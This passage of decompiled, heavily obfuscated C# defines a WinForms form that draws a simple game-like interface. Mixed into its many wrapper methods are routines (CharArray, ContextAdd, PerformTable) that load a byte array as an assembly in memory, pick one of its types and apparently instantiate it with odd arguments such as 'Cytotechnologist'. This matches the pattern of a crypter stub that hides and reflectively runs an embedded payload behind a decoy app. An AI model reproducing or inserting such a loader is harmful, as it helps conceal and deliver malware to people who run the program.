					num = ((int)num2 * -1094706997) ^ -1139179600;
					continue;
				case 31u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)(num2 * 308280670) ^ -1649862197;
					continue;
				case 30u:
					Form1.smethod_64((Control)(object)panel1, 7);
					Form1.smethod_72(timer1, 1000);
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -430318341) ^ 0x53C7F040;
					continue;
				case 29u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = (int)(num2 * 47901822) ^ -974954912;
					continue;
				case 28u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = ((int)num2 * -1943323840) ^ -455618225;
					continue;
				case 27u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -1994895802) ^ 0x3F5FF612;
					continue;
				case 26u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)(num2 * 1128809250) ^ -486527927;
					continue;
				case 25u:
					label2 = Form1.smethod_57();
					num = (int)(num2 * 392142133) ^ -782995549;
					continue;
				case 24u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)((num2 * 1098953762) ^ 0x7DC55885);
					continue;
				case 23u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 775427381;
						num4 = 775427381;
					}
					else
					{
						num3 = 940479457;
						num4 = 940479457;
					}
					num = num3 ^ (int)(num2 * 846885499);
					continue;
				}
				case 22u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -1719658525) ^ 0x763F0FBC;
					continue;
				case 21u:
					label5 = Form1.smethod_57();
					num = (int)(num2 * 269448301) ^ -1633343047;
					continue;
				case 20u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = (int)((num2 * 1208408819) ^ 0x3BF1425A);
					continue;
				case 19u:
					num = (int)(num2 * 1187392155) ^ -901117931;
					continue;
				case 18u:
					num = (int)((num2 * 813598027) ^ 0x63124C33);
					continue;
				case 17u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -734515458) ^ 0x5AB5D53A;
					continue;
				case 16u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = ((int)num2 * -997320477) ^ -780844503;
					continue;
				case 15u:
					num = (int)((num2 * 838278633) ^ 0x60D0C3F2);
					continue;
				case 14u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -277187532) ^ -1746054056;
					continue;
				case 13u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)(num2 * 1244337432) ^ -1218837101;
					continue;
				case 12u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -939088819) ^ 0x7D95B261;
					continue;
				case 11u:
					num = ((int)num2 * -1728302348) ^ 0x57D56153;
					continue;
				case 10u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -1445526606) ^ 0x74CD2AA1;
					continue;
				case 9u:
					button2 = Form1.smethod_53();
					num = (int)(num2 * 1034099862) ^ -1897332781;
					continue;
				case 8u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -1530891290) ^ -612862902;
					continue;
				case 7u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -796152192) ^ 0x5B0AA50B;
					continue;
				case 6u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -1016021849) ^ 0x3301B310;
					continue;
				case 5u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)(num2 * 1675652965) ^ -1167519041;
					continue;
				case 4u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)(num2 * 245714258) ^ -161863325;
					continue;
				case 3u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)(num2 * 699831732) ^ -1487072687;
					continue;
				case 2u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)((num2 * 1773043714) ^ 0x288E9BE9);
					continue;
				case 1u:
					num = ((int)num2 * -368184137) ^ -1984950551;
					continue;
				case 0u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 1121535466) ^ 0x18C12D59);
					continue;
				case 112u:
					break;
				default:
					Form1.smethod_92((Control)(object)this);
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		PerformTable(q);
		while (true)
		{
			int num = 48022379;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x197F762u) % 3u)
				{
				case 1u:
					goto IL_000f;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_000f:
				num = ((int)num2 * -53775497) ^ 0x1A57B2D5;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		return Form1.smethod_94(Form1.smethod_93(), Position);
	}

	private static void PerformTable(Assembly Q3)
	{
		while (true)
		{
			int num = -653870954;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8FD7A4FDu) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_0003:
				ComMember = Form1.smethod_95(Q3)[24];
				num = (int)(num2 * 215442514) ^ -680619308;
			}
		}
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
